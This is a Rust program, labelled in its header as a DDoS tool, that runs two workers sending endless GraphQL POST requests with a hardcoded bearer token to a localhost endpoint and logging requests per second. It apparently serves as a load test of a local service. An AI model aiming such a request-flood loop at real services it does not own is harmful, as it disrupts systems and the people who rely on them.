/**
Does DDOS against End points
Author: Kiran Sahoo
Date: May 3, 2023
*/
use hyper::header::CONTENT_TYPE;
use hyper::{
    body::to_bytes, client::HttpConnector, header::AUTHORIZATION, Body, Client, Request, Uri,
};
use std::{
    sync::atomic::AtomicI32,
    time::{Duration, Instant},
};

#[macro_use]
extern crate log;
const SERVICE_COUNT: usize = 2;

static TOTAL_REQ: AtomicI32 = AtomicI32::new(0);
static PREVIOUS_COUNT: AtomicI32 = AtomicI32::new(0);
static REQ_PER_SEC: AtomicI32 = AtomicI32::new(0);

pub async fn worker(id: usize) -> anyhow::Result<()> {
   // let w = format!("W_{id}: /service{id}: ");
    let w = format!("W_{id}: ");
   
    let connector = HttpConnector::new();
    let client = Client::builder().build::<_, Body>(connector);
    let query = r#"{"query":"query { books { id desc { publisher { location { flatAddress } } } } }"}"#;
    //let url = format!("http://localhost:3005/service{id}");
    let url = "http://127.0.0.1:8081/";
    let uri = url.parse::<Uri>().unwrap();
    let authorization = "Bearer eyJhbGciOiJIUzI1NiJ9.eyJhdWQiOiIiLCJzdWIiOiJtZSIsImV4cCI6MH0.41l_w0ADr1or25o-JvBMb4og4mF-nUolVtCTC7__7nI";
    loop {
        let index = TOTAL_REQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        let req = Request::post(uri.clone())
            .header(AUTHORIZATION, authorization)
            .header(CONTENT_TYPE, "application/json")
            .body(query.into())
            .unwrap();
        let instant = Instant::now();
        let reqps = REQ_PER_SEC.load(std::sync::atomic::Ordering::Relaxed);
        match client.request(req).await {
            Ok(body) => {
                let took = instant.elapsed().as_micros() as f32 / 1000.0;
                let bytes = match to_bytes(body).await {
                    Ok(bytes) => bytes,
                    Err(err) => {
                        info!("{w}{index} took {took:.3}ms {reqps}req/s: {err:?}");
                        continue;
                    }
                };
                let str = match std::str::from_utf8(&bytes) {
                    Ok(str) => str,
                    Err(err) => {
                        info!("{w}{index} took {took:.3}ms {reqps}req/s: {err:?}");
                        continue;
                    }
                };
                info!("{w}{index} took {took:.3}ms {reqps}req/s: {str}");
            }
            Err(err) => {
                let took = instant.elapsed().as_micros() as f32 / 1000.0;
                info!("{w}{index} took {took:.3}ms {reqps}req/s: {err:?}");
            }
        }
    }
}

pub fn main() {
    env_logger::builder()
        .format(|buf, record| {
            use std::io::Write;
            let file = record.file().unwrap_or("unknown");
            let line = record.line().unwrap_or(0);
            let level = record.level();
            let args = record.args();
            writeln!(buf, "{file}:{line} {level} : {args}")
        })
        .filter(Some("ddos"), log::LevelFilter::Trace)
        .try_init()
        .expect("Failed to initialize logger");
    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .expect("Failed to create tokio runtime");
    rt.block_on(async {
        let indexarr = &mut [0; SERVICE_COUNT];
        for (i, addr) in indexarr.iter_mut().enumerate() {
            *addr = i;
        }
        tokio::spawn(async {
            loop {
                let reqcount = TOTAL_REQ.load(std::sync::atomic::Ordering::Relaxed);
                let prevcount = PREVIOUS_COUNT.load(std::sync::atomic::Ordering::Relaxed);
                PREVIOUS_COUNT.store(reqcount, std::sync::atomic::Ordering::Relaxed);
                let diff = reqcount - prevcount;
                REQ_PER_SEC.store(diff, std::sync::atomic::Ordering::Relaxed);
                tokio::time::sleep(Duration::from_millis(1000)).await;
            }
        });
        let threads = indexarr.map(|i| tokio::spawn(worker(i)));
        for thread in threads {
            thread.await.unwrap().unwrap();
        }
    });
}
